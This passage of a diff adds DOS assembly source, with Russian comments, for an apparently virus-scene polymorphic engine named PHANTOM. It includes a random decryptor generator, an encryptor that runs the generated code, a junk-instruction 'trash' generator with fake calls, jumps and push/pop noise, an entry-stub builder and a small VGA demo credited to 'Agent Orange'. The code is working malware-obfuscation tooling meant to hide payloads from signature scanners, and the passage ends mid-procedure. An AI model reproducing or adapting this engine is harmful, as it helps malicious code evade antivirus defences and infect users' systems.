+		jmp	NextProc
+ThisProcIsDone:
+		cmp	[INITFLAGS],1Fh   ; все процедуры выполнены ?
+		pop	dx
+		jne	NextProc
+		ret
+INITPHANTOM	endp
+;-------------------
+ENCRYPT 	proc
+; Генерирует команды загрузки/сохранения байта из криптуемого кода,если RmF=0
+; Генерирует последовательность расшифровывающих команд - DecryptPart ,
+; параллельно в стеке генерится зеркальная последовательность - EncryptPart
+; для последующей зашифровки кода
+
+		pop	word ptr [CryptExit]
+
+		mov	word ptr [PH_LABEL],di	 ; метка дла перехода
+		call	TRCHAIN 		 ; разбавим дерьмом
+
+		test	[PH_FLAGS],RMF	; не надо загрузки байта в TMP_REG
+		jnz	MEMCRYPT
+
+; Моделируем Загрузку байта из кода
+		stc
+		call	GETFREEREG
+		mov	byte ptr [TMP_REG],dl
+
+		call	SavePRFX	     ; Если нужно сделаем префикс
+
+					     ; для команды сохранения байта
+
+		mov	word ptr [LoadSaveCMD],di
+
+
+		mov	al,10001010b	   ; MOV REG,R/M
+		stosb
+
+		mov	al,10000000b	   ; байт ModeR/M
+
+		shl	dl,3		   ; + TMP_REG
+		or	al,dl		   ; + адресацию в память
+		or	al,[BASE_RM]
+		stosb
+
+		mov	ax,[BASE_TR] ; + мусор - REALBASE = INIT + TRASH
+		stosw
+		call	TRCHAIN
+MEMCRYPT:
+; Генерим EN/DEcryptionPart
+		mov	word ptr [CRYPTLAB],di
+		; В [CRYPTLAB] будет помещен JMP в DecryptPart
+
+		call	RMTRASH
+		call	SimplyTRASH	; Поверьте так надо...
+		call	RMTRASH
+
+		mov	si,offset CRYPTTAB
+
+		mov	dl,8	  ; криптующих команд : RND (8...16)
+		call	RND
+		add	dl,8
+		mov	cl,dl
+		xor	ch,ch
+					    ; STKFRM - размер DecPart в стеке
+		mov	word ptr [STKFRM],6 ; Пока только дальний JMP
+
+		push	es	; Seg:Offs Decryptor'a
+		push	ax
+		mov	word ptr [OffsFARJump],sp  ; Для смещения - оно
+						   ; еще не известно
+
+		mov	ax,0EA90h     ; Far Jump обратно в декриптор
+		push	ax
+
+MAKE_CRYPT_CMD:
+
+		mov	dl,(ENDCRCMD-CRYPTTAB)/3-1
+		call	RND
+		xchg	al,dl
+		mov	dl,3	     ; индекс команды в таблице
+		mul	dl
+		mov	bx,ax
+
+		mov	ax,9090h     ; Stack Frame for THIS command
+		push	ax
+		push	ax
+		push	ax
+		add	word ptr [STKFRM],6  ; увеличим
+		mov	bp,sp
+
+		test	[PH_FLAGS],RMF	; Нужен префикс ? (если в память)
+		jz	DoNotPRFX
+		call	SAVEPRFX
+		mov	byte ptr [bp],26h     ; И в stack frame
+		inc	bp
+DoNotPRFX:
+		mov	ax,[si+bx]
+		stosb			; КОП
+		mov	al,ah		; ModeR/M байт
+
+		mov	ah,bl
+		mov	bl,[si+bx+2]
+		and	bl,00111111b
+		mov	dx,[si+bx]	; код зеркальной команды
+		mov	bl,ah
+
+		mov	[bp],dl
+		inc	bp
+
+		test	byte ptr [si+bx+2],KeyF ; не добавлять ключ
+		jz	DontAddKEY
+
+		mov	dl,[KEY_REG]	; + KEY_REG
+		shl	dl,3
+		or	al,dl		; This COP
+		or	dh,dl		; COP в stack frame
+DontAddKEY:
+; добaвление памяти или TMP_REG'a
+
+		mov	ah,00h
+TMP_REG 	equ	$ - 1
+		test	[PH_FLAGS],RMF
+		pushf
+		jz	AddTMP
+
+		mov	ah,[BASE_RM]
+		and	al,10111111b   ; MODE = [mem+imm16]
+		and	dh,10111111b
+AddTMP:
+		or	al,ah	       ; COP's Done
+		or	dh,ah
+		stosb
+		mov	[bp],dh
+		inc	bp
+
+		popf
+		jz	AddIMM8
+
+		mov	ax,[BASE_TR]   ; + мусор (как при загрузке байта)
+		stosw
+		mov   [bp],ax
+		inc   bp
+		inc   bp
+AddIMM8:
+		test	byte ptr [si+bx+2],ImmF
+		jz	CRCMD_DONE		   ; Immediate8  не надо
+
+		in	al,40h
+		stosb
+		mov	[bp],al   ; B stack frame
+
+CRCMD_DONE:
+		call	TRCHAIN 	; Следующую команду
+		dec	cx
+		jne	MAKE_CRYPT_CMD
+
+		mov	bp,0000h   ; выход из stackframe в DECRYPTOR
+OffsFARJump	equ	$ - 2
+		mov	[bp],di
+
+		mov	[EncryptPart],sp
+
+		test	[PH_FLAGS],RMF
+		jnz	DontMakeSaveCMD
+
+		call	SAVEPRFX      ; Сделаем команду сохранения байта -
+		mov	bx,0000h      ; возьмем команду загрузки и
+LoadSaveCMD	equ	$ - 2	      ; сбросим Direction bit
+		mov	eax,es:[bx]
+		and	al,11111101b
+
+		stosd		      ; Done
+
+		call	TRCHAIN
+DontMakeSaveCMD:
+		mov	ax,0000h
+CryptExit	equ	$ - 2
+
+		push	ax
+		ret
+ENCRYPT 	endp
+;-------------------
+CHANGECNT	proc
+
+		call	DROPCOIN
+		jz	second
+
+		mov	al,01000000b
+		or	al,[BASE_REG]
+		stosb
+		jmp	ChangeEndCrypt
+second:
+		mov	ax,1100000010000011b	; ADD/SUB BASE,imm8
+		or	ah,[BASE_REG]
+
+		call	DROPCOIN
+		jz	met
+
+		xor	byte ptr [IncDec],00001000b
+		or	ah,00101000b
+met:
+		stosw
+		push	ax
+		in	al,40h
+		and	al,3Fh
+		mov	dl,al
+		stosb
+		pop	ax
+
+		call	TRCHAIN
+
+		dec	dl
+IncDec		equ	$ - 1
+		xor	ah,00101000b
+		stosw
+		mov	al,dl
+		stosb
+
+		or	byte ptr [IncDec],00001000b
+ChangeEndCrypt:
+		call	TRCHAIN
+
+		test	[PH_FLAGS],CntF
+		jnz	Limit_
+
+		mov	al,01001000b
+		or	al,00h
+CNT_REG 	equ	$ - 1
+		stosb
+		jmp   endchange
+Limit_:
+		mov	ax,1111100010000001b
+		or	ah,[BASE_REG]
+		stosw
+		mov	ax,[DEST_CODE]
+		inc	ax
+		test	[PH_FLAGS],UcF
+		jnz	unk
+		dec	ax
+unk:
+		sub	ax,[BASE_TR]
+		mov	word ptr [PHTEMP_CNT],di
+		add	ax,[COUNTER]
+		stosw
+endchange:
+		ret
+CHANGECNT	endp
+;-------------------
+MAKEJNE 	proc
+
+		mov	dx,di
+		inc	dx
+		inc	dx
+		sub	dx,1234h
+PH_LABEL	equ	$ - 2
+		cmp	dx,80h		; Не выходит ли за пределы 128 байт
+		jb	REL8bit
+		inc	dx
+		inc	dx
+		mov	ax,850Fh	; JNE Rel16
+		stosw
+		xchg	ax,dx		; и смещение
+		neg	ax
+		stosw
+		jmp	EndJNE
+REL8bit:
+		mov	al,75h		; сделаем короткий
+		stosb
+		xchg	al,dl
+		neg	al
+		stosb
+EndJNE:
+		ret
+MAKEJNE 	endp
+;-----------------------------------------------------------------------------
+PHANTOM 	proc
+
+; Структура заполняемая для вызова PHANTOM
+;	 RELOFFS	  - TARGETOFFS + RELOFFS = реальное место выполнения
+;	 DEST_CODE	  - адрес криптуемого кода
+;	 COUNTER	  - длинна кода
+;	 TARGETPLACE	  - место для декриптора
+;	 LENDECRYPTOR	  - длинна декриптора (генерится)
+
+; Инициализация
+		pop	word ptr [EXPHANTOM]
+		cli
+
+		xor	al,al
+		mov	[PH_FLAGS],al
+		mov	[INITFLAGS],al
+		mov	[HALF_USED],al
+		mov	[REG_USED],00010000b
+
+		movzx	eax,al
+		mov	dword ptr [SUBOFFS],eax
+		mov	dword ptr [SUBOFFS+4],eax
+
+		les	di,[TARGETPLACE]    ; Куда будем генерить
+		cld
+
+		call	TRCHAIN
+
+		call	INITPHANTOM	; Part 1 - инициализация регистров
+		call	ENCRYPT 	; Part 2 - GEN EN/DEcryptionPart
+		call	CHANGECNT	; Part 3 - изменение счетчиков
+		call	MAKEJNE 	; Part 4 - циклический переход
+
+		mov	word ptr [ENDLOOP],di
+		; Для зашифровывания используется тот же декриптор -
+		; DI - адрес для временного RETF
+
+		call	TRCHAIN
+		call	FinishTR
+
+		test	[PH_FLAGS],UcF
+		jz	DONTADDOFFS
+		mov	[DEST_CODE],di	    ; делаем Relative DEST_CODE
+		call	ADDREALPLACE
+DONTADDOFFS:
+		mov	ax,di
+		sub	ax,word ptr [TARGETPLACE]
+		mov	[LENDECRYPTOR],ax   ; Длинна декриптора
+
+		sti
+		mov	ax,0000h
+EXPHANTOM	equ	$ - 2
+		push	ax
+		ret
+PHANTOM 	endp
+;-------------------
+JuNK_DOIT	proc
+; Зашифровка кода и удаление EncryptionPart
+		cli
+		pop	word ptr [EXJUNK]
+
+		push	es
+		pop	ds
+
+		mov	si,0000h   ; Сделаем временный возврат
+ENDLOOP 	equ	$ - 2
+		mov	dh,0CBh
+		xchg	[si],dh
+
+		mov	bx,0000h
+CRYPTLAB	equ	$ - 2
+				   ; Сделаем jmp SS:EncryptChain
+		mov	dl,0EAh
+		mov	ax,ss	   ; Сегмент стека
+		rol	eax,16
+		mov	ax,cs:[EncryptPart]   ; Смещение
+
+		xchg	[bx],dl
+		xchg	[bx+1],eax
+
+		push	si
+		push	bx
+		push	dx
+		push	eax
+
+		call	cs:[TARGETPLACE]
+
+		pop	eax
+		pop	dx
+		pop	bx
+		pop	si
+
+		mov	[si],dh      ; восстановим все что поменяли
+		mov	[bx],dl
+		mov	[bx+1],eax
+
+		push	cs
+		pop	ds
+
+		mov	di,[RELOFFS]   ; Сделаем Реальное смещение
+		call	ADDREALPLACE
+
+		push	ss
+		push	ss
+		pop	es
+		pop	ds
+
+		mov	dx,0000h
+StkFrm		equ	$ - 2
+
+		mov	di,sp
+		mov	si,sp
+		mov	cx,cs:[EncryptPart]
+
+		cld
+		add	di,dx
+		sub	cx,sp
+Move:
+		jcxz	EndMoveStk
+		movsb
+		dec	cx
+		jmp	Move
+EndMoveStk:
+		add	sp,dx
+
+		push	cs
+		push	cs
+		pop	es
+		pop	ds
+
+		sti
+		mov	ax,0000h
+EXJUNK		equ	$ - 2
+		push	ax
+		ret
+JuNK_DOIT	endp
+;-------------------
+AddRealPLACE	proc
+		mov	bx,1234h
+PHTEMP_BASE	equ	$ - 2
+		add	es:[bx],di
+
+		test	[PH_FLAGS],CntF
+		jz	DontLimit
+
+		mov	bx,1234h
+PHTEMP_CNT	equ	$ - 2
+		add	es:[bx],di
+DontLimit:
+		ret
+AddRealPLACE	endp
+===== end   phantom.asm =====
+
+===== begin prepare!.asm =====
+garblelen equ 5
+
+		.386
+		MODEL	TINY
+TOSTER		SEGMENT PARA PUBLIC USE16 'CODE'
+		ASSUME	CS:TOSTER,DS:TOSTER
+		ORG	100H
+START:
+
+		in	ax,40h
+		push	ax
+
+		mov	dl,al
+		and	dl,0Fh
+		mov	byte ptr [TeqEntryOffset],dl
+
+		shr	ax,4		     ; Стартвый сегмент
+		mov	word ptr [TeqEntrySEG],ax
+
+		mov	ax,cs
+		add	ax,1000h
+		mov	es,ax
+		xor	di,di
+
+		push	di
+		mov	si,offset PreparePart
+		mov	cx,9
+
+
+MakePrPart:
+		push	cx
+		lodsb
+		mov	ch,al
+		shr	cx,13
+		rep	movsb
+		push si
+
+		and	al,1Fh
+		mov	[REG_USED],al
+		and	al,0fh
+		mov	ah,al
+		shl	ah,4
+		or	ah,al
+		mov	[HALF_USED],ah
+
+		mov	cx,GARBLELen
+TrString:
+		push	cx
+		mov	dx,offset RMTRASH
+		mov	bx,offset SimplyTRASH
+
+		in	al,40h
+		mov	cl,al
+RNDExch:	xchg	bx,dx
+		dec	cl
+		jnz	RNDExch
+		call	bx
+
+		pop	cx
+		loop	TrString
+		pop si
+		pop	cx
+		loop	MakePrPart
+
+		pop	bx
+
+		mov	eax,0ffffffffh
+		stosd
+		pop	ax
+		stosw
+
+		sub	di,bx
+
+
+		MOV	AH,3CH
+		XOR	CX,CX
+		MOV	DX,OFFSET FILE
+		INT	21H
+
+		MOV	BX,AX
+
+		MOV	AH,40H
+		xor	dx,dx
+		mov	cx,di
+		push	es
+		pop	ds
+		INT	21H
+
+		MOV	AH,3EH
+		INT	21H
+
+		mov	ax,4c00h
+		int	21h
+;-----------------------------
+PreparePart	equ	$
+
+		db	01010000b    ; REG_USED + 1...4 байта команды
+		pushf
+		pusha
+		db	00110000b
+		push	ds
+		db	00110000b
+		push	es
+		db	01010001b    ; AX - не портить
+		mov	ah,62h
+		db	01011000b    ; BX - не портить
+		int	21h
+		db	10011000b
+		add	bx,1234h
+TeqEntrySEG	equ	offset $ - 2
+		db	00111000b
+		push	bx
+		db	01010000b
+		push	00h
+TeqEntryOffset	equ	offset $ - 1
+		db	00110000b
+		retf
+EndPrPart	equ	$
+
+;--------------------------
+
+file		db 'prepare!.dat',0
+
+reloffs 	dw 0
+dest_code	dw 0
+counter 	dw 0
+targetplace	dd 0
+lendecryptor	dw 0
+
+include 	phantom.asm
+include 	trash.asm
+
+TOSTER		ENDS
+                END     START
+===== end   prepare!.asm =====
+
+===== begin teqdemo.asm =====
+XSize	equ 26
+YSize	equ 26
+Diff	equ 0
+
+DemoInfo	db	'Illusory World...',13,10
+		db	'TequilaJazzz demo by Agent Orange',13,10,'$'
+
+TequilaDemo	proc
+		push	cx
+		push	di
+		push	es
+		push	0A000h
+		pop	es
+
+		mov	dx,3C8h
+		xor	al,al
+		out	dx,al
+		inc	dx
+		mov	cl,128
+		push	cx
+Palette:
+		mov	al,cl
+		neg	al
+		add	al,40h
+		jc	black
+		xor	al,al
+black:
+		out	dx,al
+		mov	al,cl
+		dec	ax
+		test	al,40h
+		je	Invert
+		not	al
+Invert:
+		out	dx,al
+		xor	al,al
+		out	dx,al
+		loop	Palette
+
+		pop	cx
+Palette2:
+		mov	al,cl
+		sub	al,41h
+		jnc	black2
+		xor	al,al
+black2:
+		out	dx,al
+		xor	ax,ax
+		out	dx,al
+		mov	al,cl
+		dec	ax
+		test	al,40h
+		je	Invert2
+		not	al
+Invert2:
+		out	dx,al
+		loop	Palette2
+Effect:
+		mov	ax,0A000h
+Seed		equ	$ - 2
+		mov	bx,00001h
+Seed2		equ	$ - 2
+
+		add	bx,ax
+		mov	word ptr [Seed],bx
+		mov	word ptr [Seed2],ax
+
+		xchg	ah,bl
+		mov	di,bx
+		mov	cx,YSize
+Cycle2:
+		push	cx
+		mov	cx,XSize
+Cycle:
+		inc	byte ptr es:[di]
+		inc	di
+		loop	Cycle
+
+		add	di,320-XSize+Diff
+		pop	cx
+		loop	Cycle2
+
+		mov	ah,1
+		int	16h
+		jz	Effect
+
+		pop	es
+		pop	di
+		pop	cx
+		ret
+TequilaDemo     endp
+===== end   teqdemo.asm =====
+
+===== begin trash.asm =====
+;  Формат слова статуса для REG/MEM trash
+;
+;  WD = 00 - W нет D нет		     0,1 Wbit & Dbit
+;	01 - W=0,1 D нет
+;	10 - W=0,1 D=1
+;	11 - W=0,1 D=0,1
+;
+;  TR = 0 - не тестировать поле REG	     2	 TestREG
+;	1 - тестировать поле REG
+;
+;					     3	 TestREG/MEM
+;  TRM = 0 - не тестить поле REG/MEM
+;	 1 - тестить на регистр
+;
+;  MemOnly = 0 - произвольно		     4	 MemOnly
+;	     1 - только в память
+;
+;  PLCMD = 00 - нет дополнительной команды   5,6 PLaceCoMmanD
+;	   01 - в КОП'e 			 местоположение
+;	   10 - в ModeRM
+;
+;  ImmF = 0 - нет дополнительного операнда    7   Immediate
+;	  1 - есть дополнительный операнд
+;
+;					     8,9,10
+;					     дополнительная команда
+;					     11,12,13
+;					     дополнительный КОП
+;
+;  KillAD = 0 - не портит AX и DX	     14  KillAX,DX
+;	    1 - портит AX и DX
+
+Wbit		equ	0
+WDbit		equ	00000011b
+TR		equ	00000100b
+TRM		equ	00001000b
+MemOnly 	equ	00010000b
+CMDinCOP	equ	00100000b
+CMDinRM 	equ	01000000b
+ImmF		equ	10000000b
+;		High Byte
+XtraCMD 	equ	00000111b
+XtraCOP 	equ	00111000b
+KillAD		equ	01000000b
+
+RMTAB		equ	$
+
+db	10001010b,10b+TR,0			; MOV REG,REG/MEM
+db	10000110b,01b+TR+TRM,0			; XCHG REG,REG
+db	10001101b,00b+TR+MemOnly,0		; LEA REG,MEM
+db	00000010b,10b+TR+CMDinCOP,111b		; ARCMD REG,REG/MEM
+db	00111000b,11b,0 			; CMP REG,REG/MEM
+db	10000100b,01b,0 			; TEST REG,REG/MEM
+db	11000110b,01b+TR+CMDinRM+TRM+ImmF,0	; MOV REG,Imm8/16
+db	10000000b,01b+TR+CMDinRM+TRM+ImmF,111b	; ARCMD REG,Imm8/16
+db	11110110b,01b+TR+CMDinRM+ImmF,0 	; TEST REG/MEM,Imm8/16
+db	11111110b,01b+TR+CMDinRM+TRM,1		; INC/DEC REG
+db	11110110b,01b+TR+CMDinRM+TRM,1+010000b	; NOT/NEG REG
+db	11110110b,01b+TR+CMDinRM,1+100000b+KillAD    ; MUL/IMUL REG/MEM
+db	10001100b,00b+TR+CMDinRM+TRM,11b	; MOV REG,SREG
+db	11010000b,01b+TR+CMDinRM+TRM,111b	; SHIFT REG,1
+db	11010010b,01b+TR+CMDinRM+TRM,111b	; SHIFT REG,CL
+
+; Замечания :
+;		Нет сдвигового мусора через НОП imm8
+;		Нет расширения НОП'а до полного размера в ARCMD , S=0
+
+ENDRMTAB	equ	$
+
+; Таблица offset'ов на SUB'ы
+SUBOFFS 	dq	0h
+		dq	0h
+
+; Таблица простого мусора
+
+RotF		equ	00000010b
+KillAX		equ	00001000b
+SmplyCMD	equ	01110000b
+
+SimplyTAB	equ	$
+
+db	10110000b,01b+TR+ImmF			; MOV REG,Imm8/16
+db	10010000b,00b+TR+KillAX 		; XCHG AX,REG
+db	01000000b,00b+TR+RotF+10000b		; INC/DEC REG
+db	10100001b,00b+KillAX+ImmF		; MOV AX,MEM
+db	00000100b,01b+KillAX+RotF+ImmF+SmplyCMD ; ARCMD AL/AX,Imm8/16
+db	10101000b,01b+ImmF			; TEST AL/AX,Imm8/16
+db	00100111b,00b+KillAX+RotF+110000b	; DAA/DAS/AAA/AAS
+db	11111000b,00b+1010000b			; STI,CLI,STD,CLD,STC,CLC
+db	11110101b,00b				; CMC
+db	10011000b,00b+KillAX			; CBW
+db	11010111b,00b+KillAX			; XLAT
+db	11001100b,00b				; INT 3
+db	10011110b,00b+KillAX+10000b		; SAHF,LAHF
+db	10010000b,00b				; NOP
+db	00100110b,00b+RotF+110000b		; ES/CS/SS/DS
+
+SimplyEND	equ	$
+
+; Замечания :
+;		Нет мусора ввода в аккумулятор из порта
+;		Нет мусора AAM,AAD
+;		Нет MOV AL,MEM
+
+; Таблица мусорных процедур
+
+TRCMDs		dw	offset SimplyTRASH
+		dw	offset SUBROUTINE
+		dw	offset CALLtoSUB
+		dw	offset RMTRASH
+		dw	offset JUMPTRASH
+		dw	offset PUSHPOPTRASH
+TREND		equ	$
+;----------------------------------------------------------------------------
+
+GETVAL		proc
+;		Взять значение по случайному индексу
+		call	RND
+		shl	dl,1
+		movzx	bx,dl
+		mov	ax,[si+bx]
+		ret
+GETVAL		endp
+;-------------------
+GETTRASHREG	proc
+		bt	bx,Wbit       ; Истинный Wbit
+		cmc
+		call	GETFREEREG    ; Берем незанятый регистр
+		call	FREEREG       ; Но не помечаем его как занятый -
+				      ; это же мусор
+		ret
+GETTRASHREG	endp
+;-------------------
+AddImmediate	proc
+; Добавление непосредственного операнда
+		test	bl,ImmF
+		jz	ExitImmed
+
+		in	al,40h
+		stosb
+		bt	bx,Wbit
+		jnc	ExitImmed
+		in	al,40h
+		stosb
+ExitImmed:
+		ret
+AddImmediate	endp
+;-------------------
+AddXtraCMD	PROC
+; Добавление дополнительной команды
+		mov	dl,bh
+		and	dl,XtraCOP
+		or	al,dl
+
+		mov	dl,bh	      ; Добавляем дополнительную команду
+		and	dl,XtraCMD
+		call	RND
+		shl	dl,3	      ; влево на 3
+		or	al,dl
+		ret
+AddXtraCMD	ENDP
+;-------------------
+MAKE_WDbits	PROC
+; Enter : Bl - flags
+; Exit	: Dl - WDbits
+;	  Bl - Real WDbits
+
+		mov	cl,bl	       ; CL - индекс WDbits
+		and	bl,NOT WDbit   ; Сбросим индекс WDbits
+		and	cl,WDbit
+		pushf
+		push	ax
+;			   ┌┬─┬─┬──────── RND bits
+		mov	dl,10100100b
+WDbits		equ	$ - 1
+		shl	cl,1
+		shr	dl,cl
+		and	dl,3
+
+		in	al,40h
+		and	al,11010100b
+		xor	byte ptr [WDbits],al
+
+		pop	ax
+		or	al,dl	       ; Истинные биты W и D
+		or	bl,dl	       ; Во флаге команды заменим индекс WD
+				       ; на истинное значение
+		popf
+		jnz	ExitWDbits
+		inc	bx	       ; Если Wbit не присутствует в команде
+				       ; то он по умолчанию W=1
+ExitWDbits:
+		ret
+MAKE_WDbits	ENDP
+;-------------------
+MAKE_ModeRM	PROC
+; Enter : AL - ModeRM байт
+;	  BX - status с RealWD
+
+		test	bl,TR
+		jnz	COPorREG
+
+		mov	dl,7	      ; Не тестируем регистр
+		call	RND
+		jmp	AddREG
+COPorREG:
+		test	bl,CMDinRM
+		jz	AddFreeREG
+
+		call	AddXtraCMD    ; Добавим команду
+		jmp	REGMEM
+AddFreeREG:
+		call	GETTRASHREG    ; Берем незанятый регистр
+AddREG:
+		shl	dl,3	      ; + REG
+		or	al,dl
+REGMEM:
+		test	bl,TRM
+		jnz	TestRM
+
+		mov	dl,3	     ; Mode
+		test	bl,MemOnly   ; Mode!=11b - только в память
+		jz	falce
+		dec	dl
+falce:
+		call	RND
+		mov	dh,dl	     ; DH=Mode
+
+		mov	dl,7	     ; DL=REG/MEM
+		call	RND
+		jmp	RMdone
+TestRM:
+		call	GETTRASHREG
+		mov	dh,3
+RMdone:
+		ror	dh,2
+		or	al,dh	      ; + Mode
+		or	al,dl	      ; + RM
+		stosb
+
+		test	dh,dh		 ; Индексная без НОП'a
+		jnz	NextMode
+		cmp	dl,00000110b	 ; НОП операнд MEM
+		je	Index16
+
+NextMode:
+		cmp	dh,01000000b	 ; Индексная + imm8
+		je	Index8
+		cmp	dh,10000000b	 ; Регистровая адресация
+		jne	ExitModeRM
+Index16:				 ; Индексная + imm16
+		in	al,40h
+		and	al,7Fh
+		stosb
+Index8:
+		in	al,40h
+		and	al,7Fh
+		stosb
+ExitModeRM:
+		ret
+MAKE_ModeRM	ENDP
+;-------------------
+FinishJP	proc
+		push	ax
+		test	al,JRQ
+		jz	FinishPP
+		call	JUMPTRASH	   ;закроем JMP
+FinishPP:
+		pop	ax
+		push	ax
+		test	al,PRQ
+		jz	JPisFinished
+		call	PUSHPOPTRASH	   ;закроем PUSH/POP
+JPisFinished:
+		pop	ax
+		ret
+FinishJP	endp
+;-------------------
+JUMPTRASH	PROC
+;		Мусор из условных переходов
+
+		test	[PH_FLAGS],JRQ
+		jnz	AddRel8toJMP	      ;Закончим Jump
+
+		mov	al,01110000B	      ;Jxx Rel8
+
+		mov	dl,0Fh
+		call	RND
+
+		or	al,dl	;Тип Jump'a готов
+		stosb
+
+		mov	word ptr [JmpPLACE],di	 ;адрес места для Relative
+
+		inc	di
+		or	[PH_FLAGS],JRQ	;Установим Jump Request
+		ret
+AddRel8toJMP:
+		mov	ax,di
+		mov	bx,1234h
+JmpPLACE	equ	$ - 2
+		sub	ax,bx
+		dec	al
+		mov	es:[bx],al
+
+		xor	[PH_FLAGS],JRQ ;Сбросим запрос на завершение Jmp'a
+		ret
+JUMPTRASH	ENDP
+;-------------------
+PUSHPOPTRASH	PROC
+;		Мусорные push'истые pop'ы
+
+		test	[PH_FLAGS],JRQ	; Если есть флаг запроса jmp'a ,то
+					; делать PUSH/POP нельзя
+		jnz	PPExit
+
+		mov	al,01010000b	; PUSH/POP
+
+		test	[PH_FLAGS],PRQ	; PUSH/POP request is set ?
+		jnz	MakePOP
+MakePUSH:
+		and	[PH_FLAGS],not PRQ
+
+		mov	dl,7		; RND регистр или SREG
+		call	RND
+		call	DROPCOIN	; PUSH reg или PUSH Sreg
+		jz	DonePUSHPOP
+
+		mov	al,00000110b	; PUSH Sreg
+		and	dl,00000011b
+		shl	dl,3
+		jmp	DonePUSHPOP
+MakePOP:
+		or	al,00001000b	; POP Reg
+		clc
+		call	GETFREEREG
+		call	FREEREG
+		or	[PH_FLAGS],PRQ
+DonePUSHPOP:
+		or	al,dl
+		stosb
+		xor	[PH_FLAGS],PRQ
+PPExit:
+		ret
+PUSHPOPTRASH	ENDP
+;-------------------
+SUBROUTINE	PROC
+
+		mov	ax,word ptr [PH_FLAGS]	 ; Расширенные флаги
+
+		test	al,SRQ		 ; SRQ установлен ?
+		jnz	FinishSUB
+
+		test	al,CRQ		 ; Не делаем процедуру
+		jz	SUBExit 	 ; если нет CALL'a
+
+		test	ax,JRQ or PRQ or MSR  ; Не делаем процедуру
+		jnz	SUBExit 	      ; если JRQ,PRQ=1
+					      ; Или замаскировано
+
+		or	al,SRQ		 ; Установим SUB request
+		and	al,not FCR	 ; Теперь можно делать CALL'ы
+
+		mov	[PH_FLAGS],al
+
+		mov	al,0E9h 	 ; JMP Relative 8 bit
+		stosb
+		mov	word ptr [JMPovrSUB],di
+		inc	di
+		inc	di
+
+		call	RMTRASH 	; + маленько мусора
+		call	SimplyTRASH
+
+		mov	bx,0000b
+SubPtr		equ	$ - 2
+
+		mov	[bx+offset SUBOFFS],di	; Заносим адрес процедуры
+		inc	bx			; в таблицу смещений на SUB'ы
+		inc	bx
+		and	bx,00000111b		; таблица из 4х релокейшнов
+		mov	word ptr [SubPtr],bx
+		jmp	SUBExit
+FinishSUB:
+		call	FinishJP	; Закончим JMP и PUSH/POP мусор
+					; (если он есть)
+		call	SimplyTRASH
+		call	RMTRASH
+
+		mov	al,0C3h
+		stosb
+
+		mov	bx,0000h
+JMPovrSUB	equ	$ - 2
+		mov	ax,di
+		sub	ax,bx
+		dec	ax
+		dec	ax
+		mov	es:[bx],ax
+		xor	[PH_FLAGS],SRQ
+SUBExit:
+		ret
+SUBROUTINE	ENDP
+;-------------------
+CALLtoSUB	PROC
+
+		mov	ax,word ptr [PH_FLAGS]
+
+		test	ax,MSR		 ; Установлен MaskCALL/SUBRequest ?
+		jnz	ExitCALL	 ; Запрещено внешней программой
+
+		test	al,CRQ		 ; Завершим
+		jnz	FinishCALL
+
+		or	al,CRQ or FCR	 ; Запретим завершение CALL'a
+					 ; пока не будет сделана хоть
+					 ; одна SUB'рутина
+		mov	[PH_FLAGS],al
+
+		mov	al,0E8h
+		stosb
+		mov	word ptr [CALLPlace],di
+		inc	di
+		inc	di
+		jmp	ExitCALL
+
+FinishCALL:
+		test	al,FCR	   ; Finish CALL Request is Set ?
+		jnz	ExitCALL   ; Да - процедуры не сделано
+NextSUB:
+		mov	dl,00000011b	  ; 4 offset'a на CALL'ы
+		mov	si,offset SUBOFFS
+		call	GETVAL
+
+		mov	bx,1234
+CALLPlace	equ	$ - 2
+
+		sub	ax,bx	       ; Зто старая SUB'рутина
+		jc	NextSUB        ; Берем другую
+
+		sub	ax,2
+		mov	es:[bx],ax
+		xor	[PH_FLAGS],CRQ
+ExitCALL:
+		ret
+CALLtoSUB	ENDP
+;-------------------
+RMTRASH 	PROC
+
+		mov	dl,(ENDRMTAB-RMTAB)/3-1
+		call	RND
+
+		xchg	al,dl
+		mov	dl,3
+		mul	dl
+
+		movzx	bx,al	       ; Index
+
+		mov	al,[bx+offset RMTAB]	 ; Load Code Operation
+		mov	bx,[bx+offset RMTAB+1]	 ; Load Status Word
+
+		test	bh,KillAD
+		jz	SimplyCMD      ; Портит ли команда AX,DX ?
+
+		test	[REG_USED],00000101b ; А можно ли ?
+		jnz	ExitRMtrash
+SimplyCMD:
+		call	MAKE_WDbits    ; Сделаем биты W и D
+
+		test	bl,CMDinCOP    ; Есть дополнительная команда ?
+		jz	OneCommand
+		call	AddXtraCMD
+OneCommand:
+		stosb
+		xor	al,al	       ; байт ModeRM
+		call	MAKE_ModeRM
+		call	AddImmediate
+ExitRMtrash:
+		ret
+RMTRASH 	ENDP
+;-------------------
+SimplyTRASH	proc
+
+		mov	dl,(SimplyEND - SimplyTAB)/2-1
+		mov	si,offset SimplyTAB	    ; AL - COP
+		call	GETVAL			    ; AH - StatByte
+
+		test	ah,KillAX
+		jz	GoodCMD      ; Портит ли команда AX ?
+
+		test	[REG_USED],00000001b ; А можно ли ?
+		jnz	ExitSimply
+GoodCMD:
+		mov	bl,ah
+
+		mov	dh,RotF 	; Выделим бит RotF
+		and	dh,bl
+		xor	bl,dh
+
+		mov	bh,al
+		xor	al,al
+		call	Make_WDbits
+		or	bl,dh		; Установим обратно бит RotF
+
+		test	bl,TR
+		jz	DontREG
+
+		shl	al,3
+		or	al,bh
+
+		call	GETTRASHREG	; Берем незанятый регистр
+		or	al,dl
+		jmp	AddCMD
+DontREG:
+		or	al,bh
+AddCMD:
+		mov	dl,bl
+		and	dl,SmplyCMD
+		ror	dl,4
+		call	RND
+		test	bl,RotF
+		jz	DontRot
+		shl	dl,3
+DontRot:
+		or	al,dl
+		stosb
+		call	AddImmediate
+ExitSimply:
+		ret
+SimplyTRASH	endp
+;-------------------
+TRCHAIN 	proc
+		pusha
+
+		mov	dl,8	 ; От 8 до 16 мусорных команд
+		call	RND
+		add	dl,8
+		movzx	cx,dl
+AddTRCommand:
+		push	cx
+
+		mov	si,offset TRCMDs   ; массив мусорных процедур
+		mov	dl,(TREND-TRCMDs)/2-1
+		call	GETVAL		   ; Возьмем offset
+		call	ax		   ; Вызовем
+
+		pop	cx
+		loop	AddTRCommand
+
+		mov	al,[PH_FLAGS]
+		call	FinishJP	   ; Закончим JMP и PUSH/POP trash
+
+		test	al,SRQ
+		jz	ExitTRchain
+		call	SUBROUTINE	   ; Закончим SUB'рутину
+		call	RMTRASH
+ExitTRchain:
+		pop	ax		   ; Не имеет значения
+		push	di
+		popa
+		ret
+TRCHAIN 	endp
+;-------------------
+FinishTR	proc
+
+		test	[PH_FLAGS],CRQ
